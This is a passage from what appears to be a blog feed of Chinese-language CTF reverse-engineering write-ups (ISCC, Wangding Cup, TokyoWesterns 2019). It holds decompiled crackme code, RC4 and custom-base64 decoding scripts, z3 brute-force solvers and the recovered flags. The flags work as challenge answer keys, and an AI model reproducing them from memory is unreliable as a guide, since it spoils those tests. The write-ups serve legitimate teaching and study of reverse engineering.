0xffffffff    dec.append(first)    dec.append(second)inputs = [0xba,0x7f,0x1c,0xea,0xc0,0x1a,0x4b,0xdf,0x0d,0xb0,0x57,0xb6,0x05,0x27,0x2c,0x80,0x20,0x6a,0x21,0x72,0x54,0x28,0x46,0x68,0x07,0xfe,0x36,0xa3,0xff,0xda,0x60,0x75]for ti in range(1588266000,1588431600):    key = get_key(ti)    for i in range(0,32,8):        first = int(hex(inputs[i+3])[2:].rjust(2,&#39;0&#39;) + hex(inputs[i+2])[2:].rjust(2,&#39;0&#39;) + hex(inputs[i+1])[2:].rjust(2,&#39;0&#39;) + hex(inputs[i])[2:].rjust(2,&#39;0&#39;),16)        second = int(hex(inputs[i+7])[2:].rjust(2,&#39;0&#39;) + hex(inputs[i+6])[2:].rjust(2,&#39;0&#39;) + hex(inputs[i+5])[2:].rjust(2,&#39;0&#39;) + hex(inputs[i+4])[2:].rjust(2,&#39;0&#39;),16)        decode(first,second,key)    decode_data = []    for i in range(0,len(dec)):        temp = hex(dec[i])[2:].rjust(8,&#39;0&#39;)        decode_data.append(int(temp[6:8],16))        decode_data.append(int(temp[4:6],16))        decode_data.append(int(temp[2:4],16))        decode_data.append(int(temp[0:2],16))    for i in range(len(decode_data)):        print(chr(replace_3_5(decode_data[i])),end=&#39;&#39;)    print(&#39;&#39;)    dec = []# flag{CI3vEr_T0_FlNd_tlMe_sS^Ff!}</code></pre><p>需要爆破时间戳，这里从2020-05-01 0:0:0开始爆破 到 2020-05-02 23:0:0，可以爆破到2020-05-02 11:33:15加密的flag，也可以直接得到flag值。</p><p><img src="images/writeup.assets/image-20200504000354079.png" srcset="/img/loading.gif" alt="image-20200504000354079"></p><p>坑点：python 整形、python运算优先级以及大小端问题</p><h3 id="苏大强的保险箱-2"><a href="#苏大强的保险箱-2" class="headerlink" title="苏大强的保险箱-2"></a>苏大强的保险箱-2</h3><pre><code class="c">int __cdecl main(int argc, const char **argv, const char **envp){  unsigned int v3; // eax  size_t v4; // rbx  int v6[12]; // [rsp+20h] [rbp-60h]  int v7; // [rsp+50h] [rbp-30h]  int v8; // [rsp+54h] [rbp-2Ch]  int v9; // [rsp+58h] [rbp-28h]  int v10; // [rsp+5Ch] [rbp-24h]  int v11; // [rsp+60h] [rbp-20h]  int v12; // [rsp+64h] [rbp-1Ch]  int v13; // [rsp+68h] [rbp-18h]  int v14; // [rsp+6Ch] [rbp-14h]  int v15; // [rsp+70h] [rbp-10h]  int v16; // [rsp+74h] [rbp-Ch]  int v17; // [rsp+78h] [rbp-8h]  int v18; // [rsp+7Ch] [rbp-4h]  unsigned __int8 v19[256]; // [rsp+A0h] [rbp+20h]  unsigned __int8 v20[256]; // [rsp+1A0h] [rbp+120h]  char Str2[8]; // [rsp+2A0h] [rbp+220h]  char Str[16]; // [rsp+2C0h] [rbp+240h]  char Buffer; // [rsp+2D0h] [rbp+250h]  unsigned int v24; // [rsp+2F0h] [rbp+270h]  int j; // [rsp+2F4h] [rbp+274h]  int v26; // [rsp+2F8h] [rbp+278h]  int i; // [rsp+2FCh] [rbp+27Ch]  _main();  memset(v19, 0, sizeof(v19));  memset(v20, 0, sizeof(v20));  printf(&quot;Please input the key:&quot;, 32i64, v20);  gets(&amp;Buffer);  strcpy(Str2, &quot;a1dWT1pJXF1USVxRV1ZbUElQSVBJ&quot;);  if ( !strcmp(&amp;Buffer, Str2) )  {    printf(&quot;Please input the flag:&quot;);    gets(Str);    v24 = strlen(Str);    v3 = strlen(Str2);    rc4_init(v19, Str2, v3);                    // rc4初始化    for ( i = 0; i &lt;= 255; ++i )      v20[i] = v19[i];    rc4_crypt(v19, Str, v24);                   // 加密flag    for ( i = 0; ; ++i )    {      v4 = i;      if ( v4 &gt;= strlen(Str) )        break;      v6[i] = Str[i];                           // 复制flag    }    memset(&amp;v7, 0, 0x50ui64);    v7 = 0xFFFFFF9D;    v8 = 0xFFFFFF87;    v9 = 0x71;    v10 = 0xFFFFFFA4;    v11 = 0xFFFFFF83;    v12 = 0xB;    v13 = 0xFFFFFFAA;    v14 = 0x53;    v15 = 0xFFFFFFC4;    v16 = 0x38;    v17 = 0x36;    v18 = 0xFFFFFF85;    v26 = 0;    for ( j = 0; j &lt;= 11; ++j )                 // 比较flag    {      if ( v6[j] != *(&amp;v7 + j) )        ++v26;    }    if ( v26 )    {      puts(&quot;Wrong!Please try again&quot;);    }    else    {                                           // 解密刚刚加密后的flag      rc4_crypt(v20, Str, v24);      printf(&quot;Congratualtions!The flag is %s\n&quot;, Str);    }    system(&quot;pause&quot;);  }  else  {    printf(&quot;Wrong key!Please try again!&quot;);    system(&quot;pause&quot;);  }  return 0;}</code></pre><p>分析可知为Rc4加密，动态调试获得密钥流：</p><pre><code class="bash">0xCD, 0x87, 0x7D, 0x96, 0x97, 0x0E, 0xAA, 0x05, 0xCC, 0x38, 0x39, 0x83</code></pre><p>解密代码如下</p><pre><code class="python">In [1]: inputs = &quot;a&quot;*12In [2]: key = [0xCD, 0x87, 0x7D, 0x96, 0x97, 0x0E, 0xAA, 0x05, 0xCC, 0x38, 0x39, 0x83]In [3]: enc = [0x9D,0x87,0x71,0xA4,0x83,0xB,0xAA,0x53,0xC4,0x38,0x36,0x85]In [4]: len(inputs)Out[4]: 12In [5]: len(key)Out[5]: 12In [6]: len(enc)Out[6]: 12In [7]: for i in range(0,12):   ...:     print(chr(ord(&#39;a&#39;) ^ key[i] ^ enc[i]))   ...:1amSuda7iangIn [8]: s = &#39;&#39;   ...: for i in range(0,12):   ...:     s += (chr(ord(&#39;a&#39;) ^ key[i] ^ enc[i]))   ...:     print(s)   ...:11a1am1amS1amSu1amSud1amSuda1amSuda71amSuda7i1amSuda7ia1amSuda7ian1amSuda7iang</code></pre><p>flag:flag{1amSuda7iang}</p><p>….</p>]]></content>
    
    
    <categories>
      
      <category>ctf</category>
      
    </categories>
    
    
    <tags>
      
      <tag>iscc re</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>网鼎杯 朱雀组 逆向 WP</title>
    <link href="/%E7%BD%91%E9%BC%8E%E6%9D%AF-%E6%9C%B1%E9%9B%80%E7%BB%84-%E9%80%86%E5%90%91-WP.html"/>
    <url>/%E7%BD%91%E9%BC%8E%E6%9D%AF-%E6%9C%B1%E9%9B%80%E7%BB%84-%E9%80%86%E5%90%91-WP.html</url>
    
    <content type="html"><![CDATA[<h2 id="go"><a href="#go" class="headerlink" title="go"></a>go</h2><p>程序主要作用就是输入正确的内容，然后经过base64加密，与硬编码的字符串进行比较，如果正确则输出flag。</p><p>动态调试，可以得到base64码表</p><p><img src="/images/pasted-258.png" srcset="/img/loading.gif" alt="upload successful"></p><p>替换码表解密脚本如下</p><pre><code class="python">import stringimport base64my_base64table = &quot;XYZFGHI2+/Jhi345jklmEnopuvwqrABCDKL6789abMNWcdefgstOPQRSTUVxyz01&quot;std_base64table =&quot;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/&quot;s = &quot;nRKKAHzMrQzaqQzKpPHClX==&quot;s = s.translate(string.maketrans(my_base64table,std_base64table))print base64.b64decode(s)# What_is_go_a_A_H</code></pre><p>可以直接输入获取flag</p><p><img src="/images/pasted-259.png" srcset="/img/loading.gif" alt="upload successful"></p><h2 id="tree"><a href="#tree" class="headerlink" title="tree"></a>tree</h2><p>这题主要逻辑就是输入<code>flag{xxxxxxxx-xxxx-xxxx-xxxx-xxxxxxxxxxxx}</code>格式的flag，然后第一个函数会对为x的位置的字符进行判断，然后将字符转换为二进制表示，然后调用第二个函数，主要是通过判断上个函数得到的二进制字符串，为0则加12，为1则加16，然后通过系统自动生成的数组得到最终加密的字符，solver代码如下：</p><p>关键需要模拟数组的起始地址，用字典表示</p><pre><code class="python">flag = [   0x00000000, 0x00000001, 0x00000062, 0x00000013, 0x00000001, 0x00000000, 0x00000000, 0x00000001,   0x00000063, 0x0000001B, 0x00000002, 0x00000000, 0x00000000, 0x00000001, 0x00000064, 0x00000006,   0x00000003, 0x00000000, 0x00000000, 0x00000001, 0x00000065, 0x0000000F, 0x00000004, 0x00000000,   0x00000000, 0x00000001, 0x00000066, 0x0000002F, 0x00000005, 0x00000000, 0x00000000, 0x00000001,   0x00000067, 0x0000002A, 0x00000006, 0x00000000, 0x00000000, 0x00000001, 0x00000068, 0x0000003A,   0x00000007, 0x00000000, 0x00000000, 0x00000001, 0x00000069, 0x00000006, 0x00000008, 0x00000000,   0x00000000, 0x00000001, 0x0000006A, 0x0000005F, 0x00000009, 0x00000000, 0x00000000, 0x00000001,   0x0000006B, 0x00000019, 0x0000000A, 0x00000000, 0x00000000, 0x00000001, 0x0000006C, 0x00000007,   0x0000000B, 0x00000000, 0x00000000, 0x00000001, 0x0000006D, 0x00000012, 0x0000000C, 0x00000000,   0x00000000, 0x00000001, 0x0000006E, 0x00000037, 0x0000000D, 0x00000000, 0x00000000, 0x00000001,   0x0000006F, 0x0000001E, 0x0000000E, 0x00000000, 0x00000000, 0x00000001, 0x00000070, 0x00000018,   0x0000000F, 0x00000000, 0x00000000, 0x00000001, 0x00000071, 0x00000016, 0x00000010, 0x00000000,   0x00000000, 0x00000001, 0x00000072, 0x00000002, 0x00000011, 0x00000000, 0x00000000, 0x00000001,   0x00000073, 0x00000069, 0x00000012, 0x00000000, 0x00000000, 0x00000001, 0x00000074, 0x0000000D,   0x00000013, 0x00000000, 0x00000000, 0x00000001, 0x00000075, 0x00000004, 0x00000014, 0x00000000,   0x00000000, 0x00000001, 0x00000076, 0x0000004B, 0x00000015, 0x00000000, 0x00000000, 0x00000001,   0x00000077, 0x00000017, 0x00000016, 0x00000000, 0x00000000, 0x00000001, 0x00000078, 0x0000000C,   0x00000017, 0x00000000, 0x00000000, 0x00000001, 0x00000079, 0x00000026, 0x00000018, 0x00000000,   0x00000000, 0x00000001, 0x0000007A, 0x00000033, 0x00000019, 0x00000000, 0x00000000, 0x00000001,   0x00000000, 0x00000005, 0x0000001A, 0x00406218, 0x00406080, 0x00000001, 0x00000000, 0x00000009,   0x0000001B, 0x00406260, 0x004062F0, 0x00000001, 0x00000000, 0x0000000C, 0x0000001C, 0x004060C8,   0x00406140, 0x00000001, 0x00000000, 0x00000010, 0x0000001D, 0x00406188, 0x00406308, 0x00000001,   0x00000000, 0x00000018, 0x0000001E, 0x004062A8, 0x00406320, 0x00000001, 0x00000000, 0x0000001C,   0x0000001F, 0x00406248, 0x004060E0, 0x00000001, 0x00000000, 0x00000022, 0x00000020, 0x00406338,   0x004061A0, 0x00000001, 0x00000000, 0x00000029, 0x00000021, 0x00406098, 0x00406200, 0x00000001,   0x00000000, 0x0000002F, 0x00000022, 0x00406290, 0x004061E8, 0x00000001, 0x00000000, 0x00000031,   0x00000023, 0x00406350, 0x00406170, 0x00000001, 0x00000000, 0x00000037, 0x00000024, 0x004060B0,   0x00406368, 0x00000001, 0x00000000, 0x00000040, 0x00000025, 0x004061D0, 0x00406380, 0x00000001,   0x00000000, 0x0000004F, 0x00000026, 0x004062C0, 0x00406398, 0x00000001, 0x00000000, 0x00000059,   0x00000027, 0x00406110, 0x004060F8, 0x00000001, 0x00000000, 0x00000060, 0x00000028, 0x004063B0,   0x004063C8, 0x00000001, 0x00000000, 0x0000006A, 0x00000029, 0x004062D8, 0x004061B8, 0x00000001,   0x00000000, 0x00000071, 0x0000002A, 0x004063E0, 0x00406128, 0x00000001, 0x00000000, 0x0000008B,   0x0000002B, 0x004063F8, 0x00406278, 0x00000001, 0x00000000, 0x000000A8, 0x0000002C, 0x00406410,   0x00406428, 0x00000001, 0x00000000, 0x000000BF, 0x0000002D, 0x00406158, 0x00406440, 0x00000001,   0x00000000, 0x000000D3, 0x0000002E, 0x00406230, 0x00406458, 0x00000001, 0x00000000, 0x000000FC,   0x0000002F, 0x00406470, 0x00406488, 0x00000001, 0x00000000, 0x00000167, 0x00000030, 0x004064A0,   0x004064B8, 0x00000001, 0x00000000, 0x000001CF, 0x00000031, 0x004064D0, 0x004064E8, 0x00000001,   0x00000000, 0x00000336, 0x00000032, 0x00406500, 0x00406518   ]#offset = 0x00406090#for i in range(0,len(flag)):#    print hex(offset + i * 4)+&quot;:&quot;+hex(flag[i])+&#39;,&#39;,flag = {0x406090:0x0, 0x406094:0x1, 0x406098:0x62, 0x40609c:0x13, 0x4060a0:0x1, 0x4060a4:0x0, 0x4060a8:0x0, 0x4060ac:0x1, 0x4060b0:0x63, 0x4060b4:0x1b, 0x4060b8:0x2, 0x4060bc:0x0, 0x4060c0:0x0, 0x4060c4:0x1, 0x4060c8:0x64, 0x4060cc:0x6, 0x4060d0:0x3, 0x4060d4:0x0, 0x4060d8:0x0, 0x4060dc:0x1, 0x4060e0:0x65, 0x4060e4:0xf, 0x4060e8:0x4, 0x4060ec:0x0, 0x4060f0:0x0, 0x4060f4:0x1, 0x4060f8:0x66, 0x4060fc:0x2f, 0x406100:0x5, 0x406104:0x0, 0x406108:0x0, 0x40610c:0x1, 0x406110:0x67, 0x406114:0x2a, 0x406118:0x6, 0x40611c:0x0, 0x406120:0x0, 0x406124:0x1, 0x406128:0x68, 0x40612c:0x3a, 0x406130:0x7, 0x406134:0x0, 0x406138:0x0, 0x40613c:0x1, 0x406140:0x69, 0x406144:0x6, 0x406148:0x8, 0x40614c:0x0, 0x406150:0x0, 0x406154:0x1, 0x406158:0x6a, 0x40615c:0x5f, 0x406160:0x9, 0x406164:0x0, 0x406168:0x0, 0x40616c:0x1, 0x406170:0x6b, 0x406174:0x19, 0x406178:0xa, 0x40617c:0x0, 0x406180:0x0, 0x406184:0x1, 0x406188:0x6c, 0x40618c:0x7, 0x406190:0xb, 0x406194:0x0, 0x406198:0x0, 0x40619c:0x1, 0x4061a0:0x6d, 0x4061a4:0x12, 0x4061a8:0xc, 0x4061ac:0x0, 0x4061b0:0x0, 0x4061b4:0x1, 0x4061b8:0x6e, 0x4061bc:0x37, 0x4061c0:0xd, 0x4061c4:0x0, 0x4061c8:0x0, 0x4061cc:0x1, 0x4061d0:0x6f, 0x4061d4:0x1e, 0x4061d8:0xe, 0x4061dc:0x0, 0x4061e0:0x0, 0x4061e4:0x1, 0x4061e8:0x70, 0x4061ec:0x18, 0x4061f0:0xf, 0x4061f4:0x0, 0x4061f8:0x0, 0x4061fc:0x1, 0x406200:0x71, 0x406204:0x16, 0x406208:0x10, 0x40620c:0x0, 0x406210:0x0, 0x406214:0x1, 0x406218:0x72, 0x40621c:0x2, 0x406220:0x11, 0x406224:0x0, 0x406228:0x0, 0x40622c:0x1, 0x406230:0x73, 0x406234:0x69, 0x406238:0x12, 0x40623c:0x0, 0x406240:0x0, 0x406244:0x1, 0x406248:0x74, 0x40624c:0xd, 0x406250:0x13, 0x406254:0x0, 0x406258:0x0, 0x40625c:0x1, 0x406260:0x75, 0x406264:0x4, 0x406268:0x14, 0x40626c:0x0, 0x406270:0x0, 0x406274:0x1, 0x406278:0x76, 0x40627c:0x4b, 0x406280:0x15, 0x406284:0x0, 0x406288:0x0, 0x40628c:0x1, 0x406290:0x77, 0x406294:0x17, 0x406298:0x16, 0x40629c:0x0, 0x4062a0:0x0, 0x4062a4:0x1, 0x4062a8:0x78, 0x4062ac:0xc, 0x4062b0:0x17, 0x4062b4:0x0, 0x4062b8:0x0, 0x4062bc:0x1, 0x4062c0:0x79, 0x4062c4:0x26, 0x4062c8:0x18, 0x4062cc:0x0, 0x4062d0:0x0, 0x4062d4:0x1, 0x4062d8:0x7a, 0x4062dc:0x33, 0x4062e0:0x19, 0x4062e4:0x0, 0x4062e8:0x0, 0x4062ec:0x1, 0x4062f0:0x0, 0x4062f4:0x5, 0x4062f8:0x1a, 0x4062fc:0x406218, 0x406300:0x406080, 0x406304:0x1, 0x406308:0x0, 0x40630c:0x9, 0x406310:0x1b, 0x406314:0x406260, 0x406318:0x4062f0, 0x40631c:0x1, 0x406320:0x0, 0x406324:0xc, 0x406328:0x1c, 0x40632c:0x4060c8, 0x406330:0x406140, 0x406334:0x1, 0x406338:0x0, 0x40633c:0x10, 0x406340:0x1d, 0x406344:0x406188, 0x406348:0x406308, 0x40634c:0x1, 0x406350:0x0, 0x406354:0x18, 0x406358:0x1e, 0x40635c:0x4062a8, 0x406360:0x406320, 0x406364:0x1, 0x406368:0x0, 0x40636c:0x1c, 0x406370:0x1f, 0x406374:0x406248, 0x406378:0x4060e0, 0x40637c:0x1, 0x406380:0x0, 0x406384:0x22, 0x406388:0x20, 0x40638c:0x406338, 0x406390:0x4061a0, 0x406394:0x1, 0x406398:0x0, 0x40639c:0x29, 0x4063a0:0x21, 0x4063a4:0x406098, 0x4063a8:0x406200, 0x4063ac:0x1, 0x4063b0:0x0, 0x4063b4:0x2f, 0x4063b8:0x22, 0x4063bc:0x406290, 0x4063c0:0x4061e8, 0x4063c4:0x1, 0x4063c8:0x0, 0x4063cc:0x31, 0x4063d0:0x23, 0x4063d4:0x406350, 0x4063d8:0x406170, 0x4063dc:0x1, 0x4063e0:0x0, 0x4063e4:0x37, 0x4063e8:0x24, 0x4063ec:0x4060b0, 0x4063f0:0x406368, 0x4063f4:0x1, 0x4063f8:0x0, 0x4063fc:0x40, 0x406400:0x25, 0x406404:0x4061d0, 0x406408:0x406380, 0x40640c:0x1, 0x406410:0x0, 0x406414:0x4f, 0x406418:0x26, 0x40641c:0x4062c0, 0x406420:0x406398, 0x406424:0x1, 0x406428:0x0, 0x40642c:0x59, 0x406430:0x27, 0x406434:0x406110, 0x406438:0x4060f8, 0x40643c:0x1, 0x406440:0x0, 0x406444:0x60, 0x406448:0x28, 0x40644c:0x4063b0, 0x406450:0x4063c8, 0x406454:0x1, 0x406458:0x0, 0x40645c:0x6a, 0x406460:0x29, 0x406464:0x4062d8, 0x406468:0x4061b8, 0x40646c:0x1, 0x406470:0x0, 0x406474:0x71, 0x406478:0x2a, 0x40647c:0x4063e0, 0x406480:0x406128, 0x406484:0x1, 0x406488:0x0, 0x40648c:0x8b, 0x406490:0x2b, 0x406494:0x4063f8, 0x406498:0x406278, 0x40649c:0x1, 0x4064a0:0x0, 0x4064a4:0xa8, 0x4064a8:0x2c, 0x4064ac:0x406410, 0x4064b0:0x406428, 0x4064b4:0x1, 0x4064b8:0x0, 0x4064bc:0xbf, 0x4064c0:0x2d, 0x4064c4:0x406158, 0x4064c8:0x406440, 0x4064cc:0x1, 0x4064d0:0x0, 0x4064d4:0xd3, 0x4064d8:0x2e, 0x4064dc:0x406230, 0x4064e0:0x406458, 0x4064e4:0x1, 0x4064e8:0x0, 0x4064ec:0xfc, 0x4064f0:0x2f, 0x4064f4:0x406470, 0x4064f8:0x406488, 0x4064fc:0x1, 0x406500:0x0, 0x406504:0x167, 0x406508:0x30, 0x40650c:0x4064a0, 0x406510:0x4064b8, 0x406514:0x1, 0x406518:0x0, 0x40651c:0x1cf, 0x406520:0x31, 0x406524:0x4064d0, 0x406528:0x4064e8, 0x40652c:0x1, 0x406530:0x0, 0x406534:0x336, 0x406538:0x32, 0x40653c:0x406500, 0x406540:0x406518}offset = 0x406530cmpstr = &#39;zvzjyvosgnzkbjjjypjbjdvmsjjyvsjx&#39;print cmpstrprint len(cmpstr)for i in range(0,len(cmpstr)):    for j in [12,16]:        try:            if flag[flag[offset+j]] == ord(cmpstr[i]):                print j,                break        except:            pass        for k in [12,16]:            try:                if flag[flag[flag[offset+j]+k]] == ord(cmpstr[i]):                    print j,k,                    break            except:                pass            for l in [12,16]:                try:                    if flag[flag[flag[flag[offset+j]+k]+l]] == ord(cmpstr[i]):                        print j,k,l,                        break                except:                    pass                for m in [12,16]:                    try:                        if flag[flag[flag[flag[flag[offset+j]+k]+l]+m]] == ord(cmpstr[i]):                            print j,k,l,m,                            break                    except:                        pass                    for n in [12,16]:                        try:                            if flag[flag[flag[flag[flag[flag[offset+j]+k]+l]+m]+n]] == ord(cmpstr[i]):                                print j,k,l,m,n,                                break                        except:                            pass                        for s in [12,16]:                            try:                                if flag[flag[flag[flag[flag[flag[flag[offset+j]+k]+l]+m]+n]+s]] == ord(cmpstr[i]):                                    print j,k,l,m,n,s,                                    break                            except:                                pass                            for buf in [12,16]:                                try:                                    if flag[flag[flag[flag[flag[flag[flag[flag[offset+j]+k]+l]+m]+n]+s]+buf]] == ord(cmpstr[i]):                                        print j,k,l,m,n,s,buf,                                        break                                except:                                    passopcode = [16,12,16,12,16,16,16,16,16,12,16,12,12,16,12,12,12,12,12,16,16,16,16,16,16,16,12,12,16,12,12,12,12,16,12,16,12,16,16,16,12,16,12,12,16,16,16,16,12,12,12,16,12,12,16,12,12,16,12,12,16,12,12,12,12,12,12,16,16,12,16,12,16,12,12,12,12,16,12,12,16,12,12,16,16,16,12,16,12,16,16,16,16,16,16,16,12,16,16,16,12,12,12,16,12,12,16,12,12,12,12,12,16,16,16,16,16,12,12,12,16,12,12,16,16,16,12,12]flag = []for i in range(0,len(opcode),4):    aaaa = &#39;&#39;    for j in range(0,4):        if opcode[i+j] == 16:            aaaa += &#39;1&#39;        elif opcode[i+j] == 12:            aaaa += &#39;0&#39;    flag.append(aaaa)print &#39;&#39;for i in flag:    print hex(int(i,2))[2:],# 得到的结果带入到flag{xxxxxxxx-xxxx-xxxx-xxxx-xxxxxxxxxxxx}# flag{afa41fc8-574f-1248-1a84-9d7f7120f89c}</code></pre>]]></content>
    
    
    <categories>
      
      <category>ctf</category>
      
    </categories>
    
    
    <tags>
      
      <tag>ctf</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>TokyoWesterns CTF 2019 Easy Crack Me</title>
    <link href="/TokyoWesterns-CTF-2019-Easy-Crack-Me.html"/>
    <url>/TokyoWesterns-CTF-2019-Easy-Crack-Me.html</url>
    
    <content type="html"><![CDATA[<h2 id="伪代码分析"><a href="#伪代码分析" class="headerlink" title="伪代码分析"></a>伪代码分析</h2><pre><code class="c">signed __int64 __fastcall main(int a1, char **a2, char **a3){  signed __int64 result; // rax  char *j; // rax  char v5; // ST1F_1  char v6; // ST1E_1  char v7; // [rsp+1Dh] [rbp-1B3h]  signed int i; // [rsp+20h] [rbp-1B0h]  signed int k; // [rsp+24h] [rbp-1ACh]  int v10; // [rsp+28h] [rbp-1A8h]  int v11; // [rsp+2Ch] [rbp-1A4h]  signed int l; // [rsp+30h] [rbp-1A0h]  signed int m; // [rsp+34h] [rbp-19Ch]  int v14; // [rsp+38h] [rbp-198h]  int v15; // [rsp+3Ch] [rbp-194h]  signed int n; // [rsp+40h] [rbp-190h]  signed int ii; // [rsp+44h] [rbp-18Ch]  int v18; // [rsp+48h] [rbp-188h]  signed int jj; // [rsp+4Ch] [rbp-184h]  char *s; // [rsp+58h] [rbp-178h]  __int64 v21; // [rsp+70h] [rbp-160h]  __int64 v22; // [rsp+78h] [rbp-158h]  __int64 v23; // [rsp+80h] [rbp-150h]  __int64 v24; // [rsp+88h] [rbp-148h]  __int64 v25; // [rsp+90h] [rbp-140h]  __int64 v26; // [rsp+98h] [rbp-138h]  __int64 v27; // [rsp+A0h] [rbp-130h]  __int64 v28; // [rsp+A8h] [rbp-128h]  __int64 v29; // [rsp+B0h] [rbp-120h]  __int64 v30; // [rsp+B8h] [rbp-118h]  __int64 v31; // [rsp+C0h] [rbp-110h]  __int64 v32; // [rsp+C8h] [rbp-108h]  __int64 v33; // [rsp+D0h] [rbp-100h]  __int64 v34; // [rsp+D8h] [rbp-F8h]  __int64 v35; // [rsp+E0h] [rbp-F0h]  __int64 v36; // [rsp+E8h] [rbp-E8h]  __int64 s1; // [rsp+F0h] [rbp-E0h]  __int64 v38; // [rsp+F8h] [rbp-D8h]  __int64 v39; // [rsp+100h] [rbp-D0h]  __int64 v40; // [rsp+108h] [rbp-C8h]  __int64 v41; // [rsp+110h] [rbp-C0h]  __int64 v42; // [rsp+118h] [rbp-B8h]  __int64 v43; // [rsp+120h] [rbp-B0h]  __int64 v44; // [rsp+128h] [rbp-A8h]  int v45[32]; // [rsp+130h] [rbp-A0h]  __int64 v46; // [rsp+1B0h] [rbp-20h]  __int64 v47; // [rsp+1B8h] [rbp-18h]  unsigned __int64 v48; // [rsp+1C8h] [rbp-8h]  v48 = __readfsqword(0x28u);  if ( a1 == 2 )  {    s = a2[1];    if ( strlen(a2[1]) != 39 )    {      puts(&quot;incorrect&quot;);      exit(0);    }    if ( memcmp(s, &quot;TWCTF{&quot;, 6uLL) || s[38] != &#39;}&#39; )    {      puts(&quot;incorrect&quot;);      exit(0);    }    s1 = 0LL;    v38 = 0LL;    v39 = 0LL;    v40 = 0LL;    v41 = 0LL;    v42 = 0LL;    v43 = 0LL;    v44 = 0LL;    v46 = &#39;76543210&#39;;    v47 = &#39;fedcba98&#39;;                           // 判断字符出现的次数    for ( i = 0; i &lt;= 15; ++i )    {      for ( j = strchr(s, *(&amp;v46 + i)); j; j = strchr(j + 1, *(&amp;v46 + i)) )        ++*(&amp;s1 + i);    }    if ( memcmp(&amp;s1, &amp;dword_400F00, 0x40uLL) )    {      puts(&quot;incorrect&quot;);      exit(0);    }    v21 = 0LL;    v22 = 0LL;    v23 = 0LL;    v24 = 0LL;    v25 = 0LL;    v26 = 0LL;    v27 = 0LL;    v28 = 0LL;    for ( k = 0; k &lt;= 7; ++k )                  // 操作中间的32位 每4位一组    {      v10 = 0;      v11 = 0;      for ( l = 0; l &lt;= 3; ++l )      {        v5 = s[4 * k + 6 + l];        v10 += v5;        v11 ^= v5;      }      *(&amp;v21 + k) = v10;      *(&amp;v25 + k) = v11;    }    v29 = 0LL;    v30 = 0LL;    v31 = 0LL;    v32 = 0LL;    v33 = 0LL;    v34 = 0LL;    v35 = 0LL;    v36 = 0LL;    for ( m = 0; m &lt;= 7; ++m )    {      v14 = 0;      v15 = 0;      for ( n = 0; n &lt;= 3; ++n )      {        v6 = s[8 * n + 6 + m];                  // 6 14 22 30        v14 += v6;                              // 7 15 23 31        v15 ^= v6;                              // 8 16 24 32      }      *(&amp;v29 + m) = v14;      *(&amp;v33 + m) = v15;    }    if ( memcmp(&amp;v21, &amp;dword_400F40, 0x20uLL) || memcmp(&amp;v25, &amp;dword_400F60, 0x20uLL) )// 对比    {      puts(&quot;incorrect&quot;);      exit(0);    }    if ( memcmp(&amp;v29, &amp;dword_400FA0, 0x20uLL) || memcmp(&amp;v33, &amp;unk_400F80, 0x20uLL) )// 对比    {      puts(&quot;incorrect&quot;);      exit(0);    }    memset(v45, 0, sizeof(v45));    for ( ii = 0; ii &lt;= 31; ++ii )              // 通过中间32位 产生v45    {      v7 = s[ii + 6];      if ( v7 &lt;= 47 || v7 &gt; 57 )      {        if ( v7 &lt;= &#39;`&#39; || v7 &gt; &#39;f&#39; )          v45[ii] = 0;        else          v45[ii] = 128;      }      else      {        v45[ii] = 255;      }    }    if ( memcmp(v45, &amp;unk_400FC0, 0x80uLL) )    {      puts(&quot;incorrect&quot;);      exit(0);    }    v18 = 0;    for ( jj = 0; jj &lt;= 15; ++jj )              // 6 8 10 12 14      v18 += s[2 * (jj + 3)];    if ( v18 != 1160 )    {      puts(&quot;incorrect&quot;);      exit(0);    }    if ( s[37] != &#39;5&#39; || s[7] != &#39;f&#39; || s[11] != &#39;8&#39; || s[12] != &#39;7&#39; || s[23] != &#39;2&#39; || s[31] != &#39;4&#39; )    {      puts(&quot;incorrect&quot;);      exit(0);    }    printf(&quot;Correct: %s\n&quot;, s, a2);    result = 0LL;  }  else  {    fwrite(&quot;./bin flag_is_here&quot;, 1uLL, 0x12uLL, stderr);    result = 1LL;  }  return result;}</code></pre><p>很明显可以使用z3求解器求解，但这里有个问题z3无法判断字符出现的次数，所以这里我使用z3进行暴力破解</p><p>暴力破解只存在一个的字符，如”a”，可以得到只有30位才能为”a”，以此类推，最大程度的限制求解器。</p><h2 id="爆破循环"><a href="#爆破循环" class="headerlink" title="爆破循环"></a>爆破循环</h2><pre><code class="python"># 爆破1位for i in range(0,32):    if i == 1 or i == 5 or i == 6 or i == 17 or i == 25 or i == 31 or i == 13 or i == 30 or i == 2 or i == 7 or i == 9 or i == 19 or i == 28 or i == 18 or i == 21:        continue    sol(i,0)# 爆破2位for i in range(0,32):    if i == 1 or i == 5 or i == 6 or i == 17 or i == 25 or i == 31 or i == 13 or i == 30 or i == 2 or i == 7 or i == 9 or i == 19 or i == 28 or i == 18 or i == 21:        continue    if i == 4 or i == 29:        continue    for j in range(0,32):        if j == 1 or j == 5 or j == 6 or j == 17 or j == 25 or j == 31 or j == 13 or j == 30 or j == 2 or j == 7 or j == 9 or j == 19 or j == 28 or j == 18 or j == 21:            continue        if i == j:            continue        if j == 4 or j == 29:            continue        sol(i,j)</code></pre><h2 id="添加限制"><a href="#添加限制" class="headerlink" title="添加限制"></a>添加限制</h2><pre><code class="python"># 爆破 循环for i in range(0,len(s)):  if i == buf or i == buf1 or i == buf2:    solver.add(s[i] == ord(&#39;b&#39;))  else:    solver.add(s[i] != ord(&#39;b&#39;))</code></pre><h2 id="最终可以得到"><a href="#最终可以得到" class="headerlink" title="最终可以得到"></a>最终可以得到</h2><pre><code class="python"># 每个字符出现的次数##       0    1    2    3    4    5    6    7    8    9    a    b    c    d    e    f#num = [0x3, 0x2, 0x2, 0x0, 0x3, 0x2, 0x1, 0x3, 0x3, 0x1, 0x1, 0x3, 0x1, 0x2, 0x2, 0x3]solver.add(s[1] == ord(&#39;f&#39;))solver.add(s[5] == ord(&#39;8&#39;))solver.add(s[6] == ord(&#39;7&#39;))solver.add(s[17] == ord(&#39;2&#39;))solver.add(s[25] == ord(&#39;4&#39;))solver.add(s[31] == ord(&#39;5&#39;))# 爆破一位solver.add(s[13] == ord(&#39;9&#39;))for i in range(len(numorchar)):    if i != 13:        solver.add(s[i] != ord(&#39;9&#39;))solver.add(s[30] == ord(&#39;a&#39;))for i in range(len(numorchar)):   